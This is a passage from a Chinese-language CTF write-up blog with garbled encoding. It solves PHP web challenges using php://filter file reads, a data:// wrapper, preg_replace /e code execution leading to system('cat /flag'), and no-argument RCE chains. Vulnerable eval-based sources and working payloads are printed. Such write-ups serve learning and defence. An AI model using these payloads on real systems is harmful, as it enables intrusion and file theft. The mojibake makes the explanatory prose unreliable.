class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br>					<span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>				&#125;<br>				<span class="hljs-keyword">else</span>&#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>				&#125;<br>			&#125;<br>			<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><code>if(true||false||false)</code><br>è¿”å›çš„ç»“æœæ˜¯trueï¼Œä¹Ÿå°±æ˜¯æ»¡è¶³ä¸€ä¸ªæ¡ä»¶æˆç«‹å³å¯ï¼Œæˆ‘ä»¬ç°åœ¨è¦è¯»å–çš„æ˜¯flag.php<br>ä½¿ç”¨ç›¸å¯¹è·¯å¾„<br>ç›¸å¯¹è·¯å¾„è®¡ç®—æ—¶ä¸­é—´ç›®å½•ä¸å­˜åœ¨å¹¶ä¸å½±å“</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers<span class="hljs-regexp">/../</span>flag<br><span class="hljs-regexp">//</span>PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7ZWE3NTMyYTktYTRjYS00MDA0LWIzOTEtZDAzZmY4Nzc3YmM0fQo/Pgo= <br></code></pre></td></tr></table></figure>
<p>è§£ç åå°±èƒ½å¾—åˆ°flagäº†</p>
<p>è¿˜å¯ä»¥åˆ©ç”¨php:&#x2F;&#x2F;filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®è¯»å–flag.php<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/i</span>ndex/resource=flag<br></code></pre></td></tr></table></figure>
<p>å¥—ä¸€ä¸ªå­—ç¬¦indexç¬¦åˆæ¡ä»¶å¹¶ä¸”ä¼ å…¥flagï¼Œè¯»å–flag.php<br>å¯ä»¥å‘ç°å½“phpå®šä½ä¸åˆ°æˆ‘ä»¬è‡ªå·±åŠ çš„filteræ—¶ä¼šæŠ¥warning<br>ä½†å¹¶æ²¡æœ‰å½±å“æ‰§è¡Œ</p>
<h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªifç”¨dataä¼ªåè®®é€šè¿‡,flagè¢«ç¦ç”¨äº†ï¼Œé‚£ä¹ˆè¯»è¯»æ³¨é‡Šé‡Œnext.php é‡Œçš„å†…å®¹<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=<span class="hljs-keyword">next</span>.php<br></code></pre></td></tr></table></figure>

<p>next.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>preg_replaceçš„&#x2F;eæ¨¡å¼å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´,ä¸çŸ¥é“è¿™ä¸ª$_SESSION[â€˜idâ€™]æ˜¯ä»€ä¹ˆé¬¼<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">ä¼ é€é—¨</a>éå¸¸è¯¦ç»†<br>å…ˆæ¥æå®šè¿™ä¸¤ä¸ª</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=<span class="hljs-variable">$&#123;</span>phpinfo()&#125;<br></code></pre></td></tr></table></figure>
<p>æˆåŠŸæ˜¾ç¤ºæˆ‘ä»¬éœ€è¦æ˜¾ç¤ºçš„å†…å®¹<br><img src="/images/M4DDC2IQVG3UJ5UHXDSK.png" srcset="/img/loading.gif" lazyload><br>éœ€è¦ä¼ å…¥$cmdå‚æ•°ï¼Œç„¶åevalæ‰§è¡Œæ‹¿åˆ°flag<br>getFlagæ²¡æœ‰è¢«è°ƒç”¨<br>è°ƒç”¨ä¸€ä¸‹</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;<span class="hljs-attribute">cmd</span>=phpinfo();<br></code></pre></td></tr></table></figure>
<p>æˆåŠŸï¼Œå¼€å§‹rce</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=<span class="hljs-variable">$&#123;</span>getFlag()&#125;&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>å¼€å§‹é¡µé¢æœªæ‰¾åˆ°å¯åˆ©ç”¨ä¿¡æ¯ï¼ŒæŠ“åŒ…ä¹Ÿä»€ä¹ˆæ²¡æœ‰å‘ç°<br>ç”¨dirsearchæœæœ<br><img src="/images/FGQ77UZZI9ZN0I.png" srcset="/img/loading.gif" lazyload><br>å‡ºç°äº†å¾ˆå¤š.gitåç¼€çš„æ–‡ä»¶ï¼Œç¡®å®šä¸ºgitæºç æ³„éœ²<br>ä½¿ç”¨githackæ‰«ä¸€æ‰«<br>æ‰«å‡ºäº†ç½‘ç«™çš„æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>å¼€å§‹ä»£ç å®¡è®¡<br>è¿™ä¸€é¢˜æœ‰å¾ˆå¤šçš„è¿‡æ»¤<br>ç¬¬äºŒä¸ªifè¿‡æ»¤è®©phpä¼ªåè®®dataåè®®éƒ½ä¸èƒ½ç”¨äº†<br>ç¬¬äºŒä¸ªif</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, NULL, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])</span></span>)<br></code></pre></td></tr></table></figure>

<p><code>[a-z,_]+ : [a-z,_]</code><br>åŒ¹é…å°å†™å­—æ¯å’Œä¸‹åˆ’çº¿ +è¡¨ç¤º1åˆ°å¤šä¸ª</p>
<p><code>(?R)?</code><br>(?R)ä»£è¡¨å½“å‰è¡¨è¾¾å¼ï¼Œå°±æ˜¯è¿™ä¸ª<code>(/[a-z,_]+((?R)?)/)</code>ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é€’å½’ï¼Œ?è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–1æ¬¡ï¼ˆè‹¥æ˜¯(?R)*åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…<code>a(b(c()d())))</code></p>
<p>å¦‚æœä¼ è¿›å»çš„å€¼æ˜¯å­—ç¬¦ä¸²æ¥ä¸€ä¸ª()ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²å°±ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œå¦‚æœ(é€’å½’)æ›¿æ¢åçš„å­—ç¬¦ä¸²åªå‰©ä¸‹<code>;</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ è¿›å»çš„expå°±ä¼šè¢«evalæ‰§è¡Œã€‚æ¯”å¦‚æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ª<code>phpinfo();</code>,ä»–è¢«æ›¿æ¢åå°±å‰©ä¸‹<code>;</code>,é‚£ä¹ˆæ›´å…·æ¡ä»¶å°±ä¼šæ‰§è¡Œ<code>phpinfo();</code></p>
<p>è€Œ(?R)?èƒ½åŒ¹é…çš„åªæœ‰<code>a(b()); a(b(c()));</code>è¿™ç§ç±»å‹çš„ï¼Œæ¯”å¦‚ä¼ å…¥<code>a(b(c()));</code>,ç¬¬ä¸€æ¬¡åŒ¹é…åï¼Œå°±å‰©<code>a(b())</code>,ç¬¬äºŒæ¬¡åŒ¹é…å,<code>a();</code>,ç¬¬ä¸‰æ¬¡åŒ¹é…åå°±å‰©ä¸‹<code>;</code>äº†ï¼Œæœ€å<code>a(b(c()))</code>å°±ä¼šè¢«evalæ‰§è¡Œã€‚</p>
<p>è¿™é¢˜çš„æ€è·¯åˆ°è¿™å°±å¾ˆæ˜ç¡®äº†ï¼Œä½¿ç”¨æ— å‚RCE<br>ä¸‹é¢æ˜¯æ— å‚RCEçš„å¸¸ç”¨å‡½æ•°</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getchwd</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">dirname</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚<br><span class="hljs-function"><span class="hljs-title">chdir</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚<br><span class="hljs-function"><span class="hljs-title">readfile</span><span class="hljs-params">()</span></span>ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span>ï¼š<span class="hljs-built_in">current</span>() çš„åˆ«åã€‚<br><span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br><span class="hljs-function"><span class="hljs-title">end</span><span class="hljs-params">()</span></span>ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br><span class="hljs-function"><span class="hljs-title">array_rand</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">array_flip</span><span class="hljs-params">()</span></span>ï¼š<span class="hljs-built_in">array_flip</span>() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚<br><span class="hljs-function"><span class="hljs-title">array_slice</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚<br><span class="hljs-function"><span class="hljs-title">array_reverse</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">chr</span><span class="hljs-params">()</span></span> å‡½æ•°ä»æŒ‡å®šçš„ï¼šASCII å€¼è¿”å›å­—ç¬¦ã€‚<br><span class="hljs-function"><span class="hljs-title">hex2bin</span><span class="hljs-params">()</span></span>ï¼šâ€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚<br><span class="hljs-function"><span class="hljs-title">getenv</span><span class="hljs-params">()</span></span>ï¼šè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨<span class="hljs-number">7.1</span>ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)ã€‚<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚<br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)));<br></code></pre></td></tr></table></figure>
<p><img src="/images/Q18QQU2TN4NTI9VNSA0.png" srcset="/img/loading.gif" lazyload><br><strong>ä»£ç è§£é‡Šï¼š</strong><br>æƒ³è¦æµè§ˆç›®å½•å†…çš„æ‰€æœ‰æ–‡ä»¶éœ€è¦ç”¨åˆ°å‡½æ•°<code>scandir()</code>ã€‚å½“<code>scandir()</code>ä¼ å…¥<code>.</code>,å®ƒå°±å¯ä»¥åˆ—å‡ºå½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ã€‚<br>ä½†è¿™é‡Œæ˜¯æ— å‚æ•°çš„RCEï¼Œæˆ‘ä»¬ä¸èƒ½å†™<code>scandir(.)</code>,è€Œ<code>localeconv()</code>å´ä¼šæœ‰ä¸€ä¸ªè¿”å›å€¼ï¼Œé‚£ä¸ªè¿”å›å€¼æ­£å¥½å°±æ˜¯<code>.</code>,å†é…åˆ<code>pos</code>æˆ–<code>current()</code>å°±å¯ä»¥æŠŠ<code>.</code>å–å‡ºæ¥ä¼ ç»™<code>scandir()</code>æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶äº†ã€‚</p>
<p>ç°åœ¨çŸ¥é“äº†flagçš„ä½ç½®ï¼Œflagä¸ºå€’æ•°ç¬¬äºŒä¸ªï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¿»è½¬å‡½æ•°<code>array_reverse()</code>ï¼Œå†ç”¨ä¸€ä¸ªnextå°±å¯ä»¥æŸ¥çœ‹flagæ–‡ä»¶äº†ï¼ŒæŸ¥çœ‹flagæ–‡ä»¶å¯ç”¨å‡½æ•°ä¸º<code>highlight_file(),readfile(),show_source()</code>ç­‰ç­‰ã€‚ã€‚ã€‚<br>payload:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">exp</span>=readfile(<span class="hljs-keyword">next</span>(array_reverse(scandir(<span class="hljs-keyword">pos</span>(localeconv())))));<br><span class="hljs-regexp">//</span>$flag = <span class="hljs-string">&quot;flag&#123;c4305172-c8af-4fa8-af1f-504d83d83583&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>è™½ç„¶æœ¬é¢˜çš„flagä½ç½®ä¸æ˜¯é‚£ä¹ˆç‰¹æ®Šï¼Œä½†æ€»ä¼šé‡åˆ°ç‰¹æ®Šä½ç½®flagçš„é¢˜ï¼Œå¯ä»¥ç”¨<code>array_rand()</code>å’Œ<code>array_flip()</code><br>(<code>array_rand()</code>è¿”å›çš„æ˜¯é”®åæ‰€ä»¥å¿…é¡»æ­é…<code>array_flip()</code>æ¥äº¤æ¢é”®åã€é”®å€¼æ¥è·å¾—é”®å€¼ï¼Œéšæœºåˆ·æ–°æ˜¾ç¤ºçš„å†…å®¹)<br>payload:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=show<span class="hljs-constructor">_source(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br></code></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•äºŒï¼šsession_id()</strong><br>ä¸Šé¢çš„æ­£åˆ™è¿‡æ»¤ä¸­å¹¶æ²¡æœ‰è¿‡æ»¤sessionï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨session_idæ¥è·å–flag<br><code>session_id()</code><br>å¯ä»¥ç”¨æ¥è·å–&#x2F;è®¾ç½®å½“å‰ä¼šè¯idã€‚<br>phpæ˜¯é»˜è®¤ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„<br>åœ¨æˆ‘ä»¬ä½¿ç”¨session_id()çš„æ—¶å€™ éœ€è¦ä½¿ç”¨<code>session_start()</code>æ¥å¼€å¯sessionä¼šè¯<br>PHPSESSIDæœ¬èº«æ˜¯å¯ä»¥ç›´æ¥åŠ ä¸Šä¾‹å¦‚flag.phpè¿™ç±»çš„å­—ç¬¦çš„<br>payload:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">exp</span>=show_source(session_id(session_start()));<br>COOKIE:<br><span class="hljs-attribute">PHPSESSID</span>=flag.php<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120738755">æ— å‚RCEä¼ é€é—¨</a><br>å†™çš„éå¸¸å¥½ï¼Œæ”¶è·é¢‡ä¸°ğŸ¤¤</p>
